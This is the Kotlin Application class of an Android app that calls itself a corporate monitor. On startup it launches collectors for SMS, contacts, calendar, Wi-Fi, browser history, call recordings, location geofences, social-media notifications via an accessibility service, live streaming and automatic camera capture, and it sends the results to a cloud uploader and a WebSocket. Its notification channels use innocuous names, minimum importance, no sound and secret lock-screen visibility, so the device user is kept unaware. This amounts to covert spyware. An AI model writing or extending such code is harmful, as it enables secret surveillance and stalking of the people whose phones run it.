package com.empresa.monitor

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import androidx.hilt.work.HiltWorkerFactory
import androidx.work.Configuration
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.service.system.*
import com.empresa.monitor.service.call.CallRecorder
import com.empresa.monitor.service.geofence.GeofenceMonitor
import com.empresa.monitor.service.social.*
import com.empresa.monitor.service.streaming.*
import com.empresa.monitor.service.dashcam.DashCam
import com.empresa.monitor.service.ai.ImageAnalyzer
import com.empresa.monitor.service.cloud.*
import dagger.hilt.android.HiltAndroidApp
import kotlinx.coroutines.*
import javax.inject.Inject

@HiltAndroidApp
class MonitorApp : Application(), Configuration.Provider {

    @Inject
    lateinit var workerFactory: HiltWorkerFactory

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Database
    lateinit var database: MonitorDatabase
        private set

    // Phase 1 monitors
    private var smsMonitor: SmsMonitor? = null
    private var contactMonitor: ContactMonitor? = null
    private var calendarMonitor: CalendarMonitor? = null
    private var wifiMonitor: WifiMonitor? = null
    private var browserMonitor: BrowserMonitor? = null
    private var dataUploader: DataUploader? = null

    // Phase 2 monitors
    private var callRecorder: CallRecorder? = null
    private var geofenceMonitor: GeofenceMonitor? = null

    // Phase 3 monitors
    private var socialNotificationListener: SocialNotificationListener? = null
    private var socialAccessibilityService: SocialAccessibilityService? = null

    // Phase 4 monitors
    private var liveStreamer: LiveStreamer? = null
    private var dashCam: DashCam? = null
    private var imageAnalyzer: ImageAnalyzer? = null
    private var autoCamera: AutoCamera? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannels()

        // Initialize database
        database = MonitorDatabase.getInstance(this)

        // Start Phase 1 monitors
        startPhase1Monitors()

        // Start Phase 2 monitors
        startPhase2Monitors()

        // Start Phase 3 monitors (services auto-start via system)
        startPhase3Monitors()

        // Start Phase 4 monitors
        startPhase4Monitors()

        // Start data uploader (will use device ID when available)
        dataUploader = DataUploader(this)
    }

    fun setDeviceIdForServices(deviceId: String) {
        // Propagate device ID to all services
        SocialNotificationListener.getInstance()?.setDeviceId(deviceId)
        liveStreamer?.setDeviceId(deviceId)
        autoCamera?.setDeviceId(deviceId)
        dashCam?.setDeviceId(deviceId)
        imageAnalyzer?.setDeviceId(deviceId)
        CloudUploader.getInstance(this).setDeviceId(deviceId)
        
        // Start uploader with device ID
        dataUploader?.start(deviceId)
        
        // Connect WebSocket
        WebSocketClient.getInstance(this).apply {
            setDeviceId(deviceId)
            connect()
        }
    }

    private fun startPhase1Monitors() {
        smsMonitor = SmsMonitor(this).also { it.startMonitoring() }
        contactMonitor = ContactMonitor(this).also { it.startMonitoring() }
        calendarMonitor = CalendarMonitor(this).also { it.startMonitoring() }
        wifiMonitor = WifiMonitor(this).also { it.startMonitoring() }
        browserMonitor = BrowserMonitor(this).also { it.startMonitoring() }
    }

    private fun startPhase2Monitors() {
        callRecorder = CallRecorder(this).also { it.startMonitoring() }
        geofenceMonitor = GeofenceMonitor(this).also { it.startMonitoring() }
    }

    private fun startPhase3Monitors() {
        // SocialNotificationListener is auto-started by the system as a service
        // SocialAccessibilityService is auto-started by the system as a service
        socialNotificationListener = SocialNotificationListener.getInstance()
        socialAccessibilityService = SocialAccessibilityService()
    }

    private fun startPhase4Monitors() {
        liveStreamer = LiveStreamer(this).also {
            it.setDeviceId("pending")
        }
        dashCam = DashCam(this).also { it.start() }
        imageAnalyzer = ImageAnalyzer(this)
        autoCamera = AutoCamera(this)

        // Download AI models in background
        scope.launch {
            imageAnalyzer?.downloadModels()
        }
    }

    override val workManagerConfiguration: Configuration
        get() = Configuration.Builder()
            .setWorkerFactory(workerFactory)
            .setMinimumLoggingLevel(android.util.Log.INFO)
            .build()

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)

            val monitorChannel = NotificationChannel(
                CHANNEL_MONITOR, "Sistema",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Servicio corporativo"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(monitorChannel)

            val alertChannel = NotificationChannel(
                CHANNEL_ALERTS, "Alertas internas",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(alertChannel)
        }
    }

    override fun onTerminate() {
        smsMonitor?.destroy()
        contactMonitor?.destroy()
        calendarMonitor?.destroy()
        wifiMonitor?.destroy()
        browserMonitor?.destroy()
        dataUploader?.destroy()
        callRecorder?.destroy()
        geofenceMonitor?.destroy()
        socialNotificationListener = null
        socialAccessibilityService = null
        liveStreamer?.destroy()
        dashCam?.destroy()
        imageAnalyzer?.destroy()
        autoCamera?.destroy()
        super.onTerminate()
    }

    companion object {
        const val CHANNEL_MONITOR = "channel_monitor_corp"
        const val CHANNEL_ALERTS = "channel_alerts_corp"
        const val NOTIFICATION_ID = 1001
    }
}
